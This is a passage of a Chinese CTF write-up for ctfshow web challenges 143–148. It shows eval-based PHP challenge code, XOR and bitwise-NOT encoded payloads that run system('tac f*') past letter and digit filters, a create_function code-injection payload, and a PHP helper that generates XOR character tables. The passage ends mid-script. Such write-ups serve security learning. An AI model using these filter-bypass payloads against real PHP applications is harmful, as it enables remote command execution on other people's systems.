class="hljs-string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><em><em>分析源码发现和141很像，只是正则过滤判断的区别，本质上考点还是无字母数字命令执行，但是这里过滤掉了-和+，导致141题的payload不能用了，但还可以用</em>&#x2F;</em>*</p>
<p>payload：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">这里~被过滤了，所以不能用取反绕过了，可以用异或绕过<br><br>?<span class="hljs-number">v1</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-number">v3</span>=*(<span class="hljs-string">&quot;<span class="hljs-variable">%1</span>3<span class="hljs-variable">%1</span>9<span class="hljs-variable">%1</span>3<span class="hljs-variable">%1</span>4<span class="hljs-variable">%0</span>5<span class="hljs-variable">%0d</span>&quot;</span>^<span class="hljs-string">&quot;<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%60</span>&quot;</span>)(<span class="hljs-string">&quot;<span class="hljs-variable">%1</span>4<span class="hljs-variable">%0</span>1<span class="hljs-variable">%0</span>3<span class="hljs-variable">%0</span>0<span class="hljs-variable">%0</span>6<span class="hljs-variable">%00</span>&quot;</span>^<span class="hljs-string">&quot;<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%2</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%2a</span>&quot;</span>)*&amp;<span class="hljs-number">v2</span>=<span class="hljs-number">1</span> <br>或<br><span class="hljs-number">v1</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-number">v3</span>=*(<span class="hljs-string">&quot;%0c<span class="hljs-variable">%0</span>6%0c%0b<span class="hljs-variable">%0</span>5<span class="hljs-variable">%0d</span>&quot;</span>^<span class="hljs-string">&quot;%7f%7f%7f%7f<span class="hljs-variable">%6</span>0<span class="hljs-variable">%60</span>&quot;</span>)(<span class="hljs-string">&quot;%0b<span class="hljs-variable">%0</span>1<span class="hljs-variable">%0</span>3<span class="hljs-variable">%0</span>0<span class="hljs-variable">%0</span>6<span class="hljs-variable">%00</span>&quot;</span>^<span class="hljs-string">&quot;%7f<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%2</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%2a</span>&quot;</span>)*&amp;<span class="hljs-number">v2</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-144（无字母数字命令执行）"><a href="#web-144（无字母数字命令执行）" class="headerlink" title="web-144（无字母数字命令执行）"></a>web-144（无字母数字命令执行）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$v3</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\W+$/&#x27;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>)===<span class="hljs-number">1</span>?<span class="hljs-literal">true</span>:<span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>这里限制了$v3的长度必须为1，所以我们可以把命令写到$v2上</strong></p>
<p><strong>构造出<code>eval(&quot;return 1-phpinfo();&quot;);</code></strong></p>
<p>payload</p>
<p>system(‘tac f*’)</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span>-&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span>(~<span class="hljs-variable">%8</span>C<span class="hljs-variable">%86</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>C<span class="hljs-variable">%DF</span><span class="hljs-variable">%99</span><span class="hljs-variable">%D5</span>)<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-145（无字母数字命令执行（三目运算符））"><a href="#web-145（无字母数字命令执行（三目运算符））" class="headerlink" title="web-145（无字母数字命令执行（三目运算符））"></a>web-145（无字母数字命令执行（三目运算符））</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>这题依然还是无字母数字命令执行，但是过滤掉了+-*&#x2F;，但是这里还可以用三目运算符</p>
<p><strong>测试<code>eval(&quot;return 1?phpinfo():1;&quot;);</code></strong></p>
<p><strong>能执行phpinfo</strong></p>
<p>payload：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span>?(~<span class="hljs-variable">%8</span>C<span class="hljs-variable">%86</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>C<span class="hljs-variable">%DF</span><span class="hljs-variable">%99</span><span class="hljs-variable">%D5</span>):&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-146（无字母数字命令执行（等号-、位运算符-））"><a href="#web-146（无字母数字命令执行（等号-、位运算符-））" class="headerlink" title="web-146（无字母数字命令执行（等号&#x3D;、位运算符||））"></a>web-146（无字母数字命令执行（等号&#x3D;、位运算符||））</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>这题比上题又多过滤了; : ?，还可以用等号（&#x3D;）和位运算符（||）</strong></p>
<p><strong>测试发现<code>eval(&quot;return 1==phpinfo()||1;&quot;);</code></strong></p>
<p><strong>可以执行phpinfo</strong></p>
<p>payload：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>(~<span class="hljs-variable">%8</span>C<span class="hljs-variable">%86</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>C<span class="hljs-variable">%DF</span><span class="hljs-variable">%99</span><span class="hljs-variable">%D5</span>)||&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-147（create-function函数）"><a href="#web-147（create-function函数）" class="headerlink" title="web-147（create_function函数）"></a>web-147（create_function函数）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="hljs-variable">$ctfshow</span>)) &#123;<br>        <span class="hljs-variable">$ctfshow</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>参考文章</strong>：<a target="_blank" rel="noopener" href="https://paper.seebug.org/755/">https://paper.seebug.org/755/</a></p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。<br><br>system =&gt;\system            \是全局命名空间<br>/^[a-z0<span class="hljs-number">-9</span>_]*$/isD<br>/i不区分大小写<br>/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[\f\n\r\t\v]<br>/D如果使用$限制结尾字符,则不允许结尾有换行<span class="hljs-comment">; </span><br>数字字母下划线都被过滤了<br><br>这个正则可以用%<span class="hljs-number">5</span>c(/)绕过<br></code></pre></td></tr></table></figure>

<p><strong>可利用create_function()进行代码注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs undefined">create_function的第一个参数是参数，第二个参数是内容。<br>create_function(&#x27;$a&#x27;,&#x27;return 123&#x27;)<br><br>类似于：<br>function f($a) &#123;<br>  return 123;<br>&#125;<br>如果我们第二个参数传入 echo 1;&#125;phpinfo();//<br>function f($a) &#123;<br>  echo 1;&#125;phpinfo();//<br>&#125;<br>可以执行phpinfo()命令<br></code></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">get: show=echo <span class="hljs-number">123</span>;&#125;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-regexp">//</span><br>post: ctf=<span class="hljs-variable">%5ccreate_function</span><br></code></pre></td></tr></table></figure>

<p><strong>原理：</strong></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,$ctfshow)) &#123; <br>	%5ccreate_function(<span class="hljs-string">&#x27;&#x27;</span>,echo <span class="hljs-number">123</span>;&#125;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-comment">//);&#125;</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="create-function（）"><a href="#create-function（）" class="headerlink" title="create_function（）"></a>create_function（）</h3><p>create_function()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs undefined">create_function的第一个参数是参数，第二个参数是内容。<br><br>create_function(&#x27;$a&#x27;,&#x27;return 123&#x27;)<br><br>类似于：<br>function f($a) &#123;<br>  return 123;<br>&#125;<br><br>如果我们第二个参数传入 echo 1;&#125;phpinfo();//<br>function f($a) &#123;<br>  echo 1;&#125;phpinfo();//<br>&#125;<br>可以执行phpinfo()命令<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-148（无字母数字命令执行（异或绕过））"><a href="#web-148（无字母数字命令执行（异或绕过））" class="headerlink" title="web-148（无字母数字命令执行（异或绕过））"></a>web-148（无字母数字命令执行（异或绕过））</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_ctfshow_fl0g</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>解题思路：</strong></p>
<p><strong>没有过滤^,所以可以用异或构造：</strong></p>
<p><strong>使用脚本时注意修改脚本中的正则。</strong></p>
<p><strong>python脚本：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br>	<span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>			<span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>		&#125;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>			<span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>		&#125;<br>		<span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br>		<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>		<span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>		<span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>			<span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>		&#125;<br>	&#125;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><br></code></pre></td></tr></table></figure>

<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-comment"># author yu22x</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span 